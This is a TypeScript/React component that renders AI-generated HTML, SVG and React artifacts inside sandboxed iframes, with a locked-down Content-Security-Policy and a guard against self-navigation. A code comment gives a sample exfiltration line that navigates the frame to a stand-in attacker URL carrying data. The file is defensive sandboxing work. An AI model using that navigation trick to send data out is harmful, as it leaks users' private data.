import { memo, useCallback, useEffect, useMemo, useRef, useState, type FC } from 'react';
import type { ArtifactType } from '@/providers/ArtifactProvider';
import { MarkdownText } from '@/components/thread/MarkdownText';
import { CodeBlock } from '@/components/thread/CodeBlock';
import { app } from '@/lib/ipc-client';

/**
 * Sandboxed iframe host for html / svg / react artifacts.
 *
 * SECURITY: `sandbox="allow-scripts"` only — deliberately omits
 * `allow-same-origin` so artifact scripts cannot reach `window.app`,
 * cookies, localStorage, or the parent DOM.
 */
const SandboxedFrame: FC<{ srcDoc: string; title: string }> = memo(({ srcDoc, title }) => {
  // A sandboxed srcdoc frame can still exfiltrate by navigating ITSELF
  // (location.href = 'https://attacker/?data'), which connect-src doesn't
  // cover. The CSP adds `navigate-to 'none'`; this onLoad guard is defense in
  // depth — if the frame navigates AWAY from the srcDoc we intentionally set,
  // blank it. We track the srcDoc we last committed so a legitimate
  // artifact/version update (which changes `srcDoc` and triggers a load) is
  // allowed, while an in-frame `location =` navigation (which does NOT change
  // our prop) is treated as hostile.
  const committedSrcDoc = useRef<string | null>(null);
  const handleLoad = useCallback(
    (e: React.SyntheticEvent<HTMLIFrameElement>) => {
      if (committedSrcDoc.current === srcDoc) {
        // Load fired without our srcDoc changing → self-navigation. Block it.
        e.currentTarget.srcdoc = '<!doctype html><meta charset="utf-8"><title>blocked</title>';
        return;
      }
      committedSrcDoc.current = srcDoc;
    },
    [srcDoc],
  );
  return (
    <iframe
      title={title}
      srcDoc={srcDoc}
      sandbox="allow-scripts"
      referrerPolicy="no-referrer"
      onLoad={handleLoad}
      className="h-full w-full border-0 bg-white"
    />
  );
});

const BASE_STYLES =
  'body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,sans-serif;color:#0f172a;background:#ffffff}*,*::before,*::after{box-sizing:border-box}';

/**
 * CSP for artifact frames. Blocks all network egress so a model-supplied script
 * can't beacon/fetch to external or localhost/private targets. `img-src` allows
 * only inline data URIs.
 *
 * `react` mode is fully network-free: React is bundled locally in the main
 * process (see electron/ipc/artifact-bundle.ts) and inlined into the document,
 * so there are NO remote scripts and NO allowed connect origins. It only needs
 * `script-src 'unsafe-inline'` to execute the inlined IIFE — no `'unsafe-eval'`
 * (production React does not use eval/Function) and no CDN origin (which would
 * be a data-exfiltration channel for untrusted model code).
 *
 * The policy is identical for every artifact mode: closed by default, inline
 * scripts only (all script content is constructed by us, never model-supplied
 * as an external reference), and no network egress whatsoever.
 */
function cspMeta(): string {
  const policy = [
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    'img-src data:',
    'font-src data:',
    "connect-src 'none'",
    "form-action 'none'",
    "navigate-to 'none'",
    "base-uri 'none'",
  ].join('; ');
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
}

function wrapHtml(content: string): string {
  const trimmed = content.trim();
  const csp = cspMeta();
  // Always re-wrap into a known-safe document with the CSP as the FIRST head
  // element, so nothing (esp. a <script>) can run before the policy applies.
  // We DO preserve safe head children (<style>/<link>/<meta>) so full-document
  // artifacts keep their styling, but strip <script> from the head (it would
  // execute pre-CSP) — inline scripts in <body> still run under the CSP.
  const headMatch = /<head\b[^>]*>([\s\S]*?)<\/head>/i.exec(trimmed);
  let safeHead = '';
  if (headMatch) {
    safeHead = headMatch[1]
      .replace(/<script\b[\s\S]*?<\/script>/gi, '')
      .replace(/<meta\b[^>]*http-equiv=["']?content-security-policy["']?[^>]*>/gi, '');
  }
  let body: string;
  const bodyMatch = /<body\b[^>]*>([\s\S]*?)<\/body>/i.exec(trimmed);
  if (bodyMatch) {
    body = bodyMatch[1];
  } else {
    body = trimmed
      .replace(/^<!doctype[^>]*>/i, '')
      .replace(/<head\b[^>]*>[\s\S]*?<\/head>/gi, '')
      .replace(/<\/?html[^>]*>/gi, '')
      .replace(/<\/?body[^>]*>/gi, '')
      .trim();
  }
  return `<!doctype html><html><head><meta charset="utf-8">${csp}<style>${BASE_STYLES}</style>${safeHead}</head><body>${body}</body></html>`;
}

function wrapSvg(content: string): string {
  const svg = content.trim();
  const body = svg.startsWith('<svg')
    ? svg
    : `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">${svg}</svg>`;
  return `<!doctype html><html><head><meta charset="utf-8">${cspMeta()}<style>${BASE_STYLES}svg{display:block;max-width:100%;height:auto;margin:auto}</style></head><body>${body}</body></html>`;
}

/**
 * Build the standalone document for a React artifact. React is bundled locally
 * in the main process (electron/ipc/artifact-bundle.ts) into a self-contained
 * IIFE with zero remote references, so we inline it directly under a fully
 * network-free CSP — no CDN, no `connect-src`, no data-exfiltration surface.
 * The mount + error-reporting bootstrap is baked into the bundle itself.
 */
function wrapReactBundle(bundledCode: string): string {
  // Neutralize any literal `</script>` sequence in the bundle so it can't
  // prematurely close the inline <script> tag we drop it into.
  const escaped = bundledCode.replace(/<\/script>/gi, '<\\/script>');
  return [
    '<!doctype html><html><head><meta charset="utf-8">',
    cspMeta(),
    `<style>${BASE_STYLES}#root{min-height:100vh}</style>`,
    '</head><body><div id="root"></div>',
    '<script>',
    escaped,
    '</script>',
    '</body></html>',
  ].join('');
}

/**
 * React artifacts are compiled to a self-contained bundle in the main process
 * (see electron/ipc/artifact-bundle.ts) before rendering. While that IPC round
 * trip is in flight we show a lightweight "Rendering…" state; on failure we
 * show the bundler error alongside the raw source so the preview degrades
 * gracefully (there is no network dependency to fall back to anymore).
 */
const ReactArtifact: FC<{ content: string; title: string }> = ({ content, title }) => {
  const [state, setState] = useState<
    { status: 'loading' } | { status: 'ready'; srcDoc: string } | { status: 'error'; error: string }
  >({ status: 'loading' });

  useEffect(() => {
    let cancelled = false;
    setState({ status: 'loading' });
    app.artifacts
      .bundleReact(content)
      .then((result) => {
        if (cancelled) return;
        if (result.ok) {
          setState({ status: 'ready', srcDoc: wrapReactBundle(result.code) });
        } else {
          setState({ status: 'error', error: result.error });
        }
      })
      .catch((err: unknown) => {
        if (cancelled) return;
        setState({ status: 'error', error: err instanceof Error ? err.message : String(err) });
      });
    return () => {
      cancelled = true;
    };
  }, [content]);

  if (state.status === 'loading') {
    return <div className="flex h-full items-center justify-center text-xs text-muted-foreground">Rendering…</div>;
  }

  if (state.status === 'error') {
    return (
      <div className="flex h-full flex-col">
        <div className="border-b border-red-500/30 bg-red-500/10 px-4 py-2 text-xs text-red-700 dark:text-red-400">
          Failed to build React preview: {state.error}
        </div>
        <div className="min-h-0 flex-1 overflow-auto p-3">
          <CodeBlock code={content} language="jsx" maxHeight="none" />
        </div>
      </div>
    );
  }

  return <SandboxedFrame srcDoc={state.srcDoc} title={title} />;
};

/** `mermaid` is not in package.json (npmjs.org is blocked) — render source with a note. */
const MermaidStub: FC<{ content: string }> = ({ content }) => (
  <div className="flex h-full flex-col">
    <div className="border-b border-amber-500/30 bg-amber-500/10 px-4 py-2 text-xs text-amber-700 dark:text-amber-400">
      Mermaid rendering is not available in this build. Showing diagram source.
    </div>
    <div className="min-h-0 flex-1 overflow-auto p-3">
      <CodeBlock code={content} language="mermaid" maxHeight="none" />
    </div>
  </div>
);

export const ArtifactRenderer: FC<{ type: ArtifactType; content: string; title: string }> = ({
  type,
  content,
  title,
}) => {
  const srcDoc = useMemo(() => {
    if (type === 'html') return wrapHtml(content);
    if (type === 'svg') return wrapSvg(content);
    return null;
  }, [type, content]);

  if (type === 'markdown') {
    return (
      <div className="h-full overflow-y-auto px-5 py-4">
        <MarkdownText text={content} />
      </div>
    );
  }

  if (type === 'mermaid') {
    return <MermaidStub content={content} />;
  }

  if (type === 'react') {
    return <ReactArtifact content={content} title={title} />;
  }

  if (srcDoc != null) {
    return <SandboxedFrame srcDoc={srcDoc} title={title} />;
  }

  // 'text' fallback
  return (
    <div className="h-full overflow-auto p-4">
      <pre className="whitespace-pre-wrap break-words font-mono text-xs text-foreground">{content}</pre>
    </div>
  );
};
